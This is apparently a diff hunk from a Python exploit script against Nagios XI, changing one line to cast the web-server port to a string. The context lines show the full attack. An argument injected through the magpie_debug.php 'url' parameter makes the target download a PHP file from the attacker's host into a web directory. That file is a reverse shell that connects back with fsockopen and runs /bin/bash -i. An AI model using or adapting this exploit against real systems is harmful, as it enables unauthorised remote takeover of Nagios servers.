@@ -47,7 +47,7 @@ class burn():
     self.url = "http://" + self.target
     url = self.url
     self.exPath = "/nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php?url="
-    self.payload = "https://" + self.lhost + ":" + self.wport +"/shelb.php%20-o%20/usr/local/nagvis/share/shelb.php"
+    self.payload = "https://" + self.lhost + ":" + str(self.wport) +"/shelb.php%20-o%20/usr/local/nagvis/share/shelb.php"
     shell = """<?php $sock=fsockopen(""" +'"' + self.lhost  + '"'+  "," + self.lport + """);$proc=proc_open(""" + '"'+"/bin/bash -i"+'"' + """, array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>"""
     wshell(shell)
     server_address = (self.lhost, int(self.wport))
